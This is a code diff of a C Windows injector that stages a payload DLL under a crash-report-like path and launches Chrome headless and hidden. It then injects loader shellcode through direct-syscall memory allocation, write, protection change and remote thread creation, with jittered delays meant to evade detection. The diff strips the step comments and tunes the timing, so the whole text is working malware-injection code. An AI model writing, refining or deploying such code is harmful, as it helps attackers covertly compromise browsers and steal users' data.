@@ -79,7 +79,6 @@ BOOL kill_browser(const char* exe_name) {
 BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
     const char* exe_name = browser_exe_names[ctx->browser];
 
-    // Step 1: Drop DLL to a path that looks like a browser crash report
     generate_drop_path(ctx->dll_temp_path, MAX_PATH, browser_user_data_subdirs[ctx->browser]);
 
     HANDLE hTmp = CreateFileA(ctx->dll_temp_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
@@ -93,7 +92,6 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
     CloseHandle(hTmp);
     printf("[+] Staged %s\n", ctx->dll_temp_path);
 
-    // Step 2: Build shellcode
     DWORD sc_size;
     PBYTE sc = build_loader_shellcode(ctx->dll_temp_path, &sc_size);
     if (!sc) {
@@ -102,14 +100,13 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
         return FALSE;
     }
 
-    // Step 3: Launch browser normally — no CREATE_SUSPENDED
     STARTUPINFOA si = { .cb = sizeof(si) };
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_MINIMIZE;
     PROCESS_INFORMATION pi = {0};
 
-    char cmdline[MAX_PATH + 64];
-    snprintf(cmdline, sizeof(cmdline), "\"%s\" --no-startup-window --disable-gpu", ctx->chrome_path);
+    char cmdline[MAX_PATH + 128];
+    snprintf(cmdline, sizeof(cmdline), "\"%s\" --headless=new --disable-gpu", ctx->chrome_path);
 
     if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
@@ -124,12 +121,15 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
     ctx->pid = pi.dwProcessId;
 
     printf("[+] Spawned PID %lu\n", ctx->pid);
+    printf("[*] Waiting for browser init...\n");
+    jitter_sleep(4000, 6000);
 
-    // Step 6: Wait for process to initialize — jittered delay
-    printf("[*] Waiting for initialization...\n");
-    jitter_sleep(3000, 5000);
+    DWORD exit_code = 0;
+    if (GetExitCodeProcess(pi.hProcess, &exit_code) && exit_code != STILL_ACTIVE) {
+        printf("[-] Process exited (code %lu)\n", exit_code);
+        goto fail;
+    }
 
-    // Step 7: Allocate memory in target
     PVOID remote_base = NULL;
     SIZE_T region_size = sc_size;
     NTSTATUS status = Sc_NtAllocateVirtualMemory(pi.hProcess, &remote_base, 0,
@@ -140,7 +140,6 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
         goto fail;
     }
 
-    // Step 8: Write shellcode — small jitter between write and protect
     SIZE_T written;
     status = Sc_NtWriteVirtualMemory(pi.hProcess, remote_base, sc, sc_size, &written);
     free(sc);
@@ -150,9 +149,8 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
         goto fail;
     }
 
-    jitter_sleep(500, 1200);
+    jitter_sleep(300, 800);
 
-    // Step 9: RW -> RX
     ULONG old_prot;
     SIZE_T prot_size = sc_size;
     PVOID prot_base = remote_base;
@@ -163,9 +161,8 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
         goto fail;
     }
 
-    jitter_sleep(300, 800);
+    jitter_sleep(200, 500);
 
-    // Step 10: Create remote thread via NtCreateThreadEx
     HANDLE hRemoteThread = NULL;
     status = Sc_NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL,
                                   pi.hProcess, remote_base, NULL,
